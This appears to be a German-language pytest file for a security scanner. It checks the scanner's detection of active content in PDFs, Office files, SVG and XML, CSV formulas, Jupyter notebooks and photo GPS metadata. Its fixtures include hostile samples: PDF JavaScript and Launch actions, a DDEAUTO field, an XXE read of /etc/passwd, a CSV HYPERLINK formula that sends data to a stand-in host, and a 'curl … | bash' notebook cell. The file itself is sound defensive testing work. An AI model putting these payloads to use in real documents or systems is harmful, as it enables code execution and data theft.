"""Scanner-Matrix DOC-01 bis DOC-04, DAT-02, COD-02 (Prüfkatalog A03, A20, A21, B21, G08)."""

import io
import json
import zipfile
from pathlib import Path

import pytest

from luibui_scan.analyzers.a_dateien import DateienAnalyzer
from luibui_scan.context import ScanContext
from luibui_scan.inventory import build_inventory
from luibui_scan.models import Achse, Finding, Pruefumfang, ScanArt, Schwere


def analyze(root: Path, files: dict[str, bytes | str]) -> list[Finding]:
    for rel, content in files.items():
        (root / rel).parent.mkdir(parents=True, exist_ok=True)
        (root / rel).write_bytes(content.encode() if isinstance(content, str) else content)
    ctx = ScanContext(
        root=root,
        scan_art=ScanArt.INTENSIV,
        pruefumfang=Pruefumfang.PAKET,
        inventory=build_inventory(root).entries,
    )
    return DateienAnalyzer().analyze(ctx)


def by_rule(findings: list[Finding], rule: str) -> Finding | None:
    return next((f for f in findings if f.rule_id == rule), None)


def zip_bytes(entries: dict[str, str]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name, data in entries.items():
            zf.writestr(name, data)
    return buf.getvalue()


# --- DOC-01 PDF ------------------------------------------------------------------------------


def pdf(names: bytes) -> bytes:
    return (
        b"%PDF-1.7\n1 0 obj << /Type /Catalog " + names + b" >> endobj\n"
        b"trailer << /Root 1 0 R >>\n%%EOF\n"
    )


@pytest.mark.parametrize(
    ("names", "schwere"),
    [
        (b"/OpenAction << /S /JavaScript /JS (app.alert(1)) >>", Schwere.H),
        (b"/Names << /J#61vaScript 2 0 R >>", Schwere.H),
        (b"/OpenAction << /S /Launch /F (calc.exe) >>", Schwere.H),
        (b"/OpenAction 3 0 R", Schwere.M),
    ],
)
def test_active_pdf(tmp_path: Path, names: bytes, schwere: Schwere) -> None:
    f = by_rule(analyze(tmp_path, {"handbuch.pdf": pdf(names)}), "LB-A21-pdf-aktiv")
    assert f is not None and f.schwere is schwere


def test_plain_pdf(tmp_path: Path) -> None:
    assert analyze(tmp_path, {"handbuch.pdf": pdf(b"/Pages 2 0 R")}) == []


# --- DOC-02 Office ---------------------------------------------------------------------------

REL_TEMPLATE = (
    '<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/'
    '2006/relationships/attachedTemplate" Target="https://x.invalid/t.dotm" '
    'TargetMode="External"/></Relationships>'
)


@pytest.mark.parametrize(
    ("name", "entries"),
    [
        ("brief.docm", {"word/document.xml": "<w:document/>", "word/vbaProject.bin": "x"}),
        ("brief.docx", {"word/_rels/settings.xml.rels": REL_TEMPLATE}),
        ("tabelle.xlsx", {"xl/worksheets/sheet1.xml": '<f>DDEAUTO c:\\\\x "/c echo"</f><instr/>'}),
    ],
)
def test_active_office(tmp_path: Path, name: str, entries: dict[str, str]) -> None:
    found = analyze(tmp_path, {name: zip_bytes(entries)})
    f = by_rule(found, "LB-A21-office-aktiv")
    assert f is not None and f.schwere is Schwere.H
    assert by_rule(found, "LB-A07-archiv-im-paket") is None


def test_ole_document_with_macros(tmp_path: Path) -> None:
    ole = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\0" * 64 + "_VBA_PROJECT".encode("utf-16-le")
    assert by_rule(analyze(tmp_path, {"alt.doc": ole}), "LB-A21-office-aktiv") is not None


def test_plain_office(tmp_path: Path) -> None:
    rels = (
        '<Relationships><Relationship Type="x/hyperlink" Target="https://x.example" '
        'TargetMode="External"/></Relationships>'
    )
    doc = zip_bytes(
        {
            "word/document.xml": "<w:t>Text über DDE-Schnittstellen</w:t>",
            "word/_rels/document.xml.rels": rels,
        }
    )
    assert analyze(tmp_path, {"brief.docx": doc}) == []


# --- DOC-03 SVG, XML -------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("name", "content"),
    [
        ("logo.svg", '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'),
        ("logo.svg", '<svg><rect onload="fetch(1)"/></svg>'),
        (
            "daten.xml",
            '<?xml version="1.0"?><!DOCTYPE a [<!ENTITY x SYSTEM "file:///etc/passwd">]><a>&x;</a>',
        ),
    ],
)
def test_active_svg_and_xxe(tmp_path: Path, name: str, content: str) -> None:
    f = by_rule(analyze(tmp_path, {name: content}), "LB-B21-aktive-inhalte")
    assert f is not None and f.schwere is Schwere.M


def test_plain_svg_and_xml(tmp_path: Path) -> None:
    files = {
        "logo.svg": '<svg xmlns="http://www.w3.org/2000/svg"><circle r="4" fill="#0E5E5B"/></svg>',
        "pom.xml": '<?xml version="1.0"?><project><name>x</name></project>',
    }
    assert analyze(tmp_path, files) == []


# --- DOC-04 GPS in photos --------------------------------------------------------------------


def exif_jpeg(with_gps: bool) -> bytes:
    """Minimal JPEG with an Exif block: IFD0 → GPS IFD with GPSLatitude (little endian)."""
    tiff = bytearray(b"II*\x00" + (8).to_bytes(4, "little"))
    tiff += (1).to_bytes(2, "little")  # IFD0: one entry
    tag = 0x8825 if with_gps else 0x010F
    tiff += tag.to_bytes(2, "little") + (4).to_bytes(2, "little") + (1).to_bytes(4, "little")
    tiff += (26).to_bytes(4, "little") + (0).to_bytes(4, "little")
    tiff += (1).to_bytes(2, "little")  # GPS IFD at 26: one entry
    tiff += (0x0002).to_bytes(2, "little") + (5).to_bytes(2, "little") + (3).to_bytes(4, "little")
    tiff += (0).to_bytes(4, "little") + (0).to_bytes(4, "little")
    app1 = b"Exif\x00\x00" + bytes(tiff)
    return b"\xff\xd8" + b"\xff\xe1" + (len(app1) + 2).to_bytes(2, "big") + app1 + b"\xff\xd9"


def test_photo_with_gps(tmp_path: Path) -> None:
    f = by_rule(analyze(tmp_path, {"foto.jpg": exif_jpeg(True)}), "LB-G08-standort-im-bild")
    assert f is not None and f.achse is Achse.DSGVO and f.schwere is Schwere.M


def test_photo_without_gps(tmp_path: Path) -> None:
    assert (
        by_rule(analyze(tmp_path, {"foto.jpg": exif_jpeg(False)}), "LB-G08-standort-im-bild")
        is None
    )


def test_broken_exif_does_not_crash(tmp_path: Path) -> None:
    broken = b"\xff\xd8\xff\xe1\x00\x10Exif\x00\x00II*\x00\xff\xff\xff\xff\xff\xd9"
    assert by_rule(analyze(tmp_path, {"foto.jpg": broken}), "LB-G08-standort-im-bild") is None


# --- DAT-02 formulas -------------------------------------------------------------------------


def test_dangerous_formula(tmp_path: Path) -> None:
    csv = 'name,link\nx,"=HYPERLINK(""https://x.invalid/?d=""&A1,""klick"")"\n'
    f = by_rule(analyze(tmp_path, {"daten.csv": csv}), "LB-A20-formel-in-tabelle")
    assert f is not None and f.schwere is Schwere.H and f.zeile == 2


def test_plain_formula_is_note(tmp_path: Path) -> None:
    f = by_rule(
        analyze(tmp_path, {"daten.csv": "a,b\n1,=SUM(A1:A2)\n"}), "LB-A20-formel-in-tabelle"
    )
    assert f is not None and f.schwere is Schwere.N


def test_negative_numbers_are_no_formula(tmp_path: Path) -> None:
    csv = "wert,mail\n-5,@nutzer\n+3.2,x\n"
    assert by_rule(analyze(tmp_path, {"daten.csv": csv}), "LB-A20-formel-in-tabelle") is None


# --- COD-02 notebooks ------------------------------------------------------------------------


def notebook(*cells: str) -> str:
    return json.dumps(
        {"cells": [{"cell_type": "code", "source": [c]} for c in cells], "nbformat": 4}
    )


def test_notebook_downloading_and_running(tmp_path: Path) -> None:
    nb = notebook("import pandas", "!curl -s https://x.invalid/i.sh | bash")
    f = by_rule(analyze(tmp_path, {"demo.ipynb": nb}), "LB-A03-installationsskript")
    assert f is not None and "Zelle 2" in (f.beleg or "")


def test_notebook_with_pip(tmp_path: Path) -> None:
    nb = notebook("!pip install pandas==2.2", "%%bash\necho fertig")
    assert by_rule(analyze(tmp_path, {"demo.ipynb": nb}), "LB-A03-installationsskript") is None
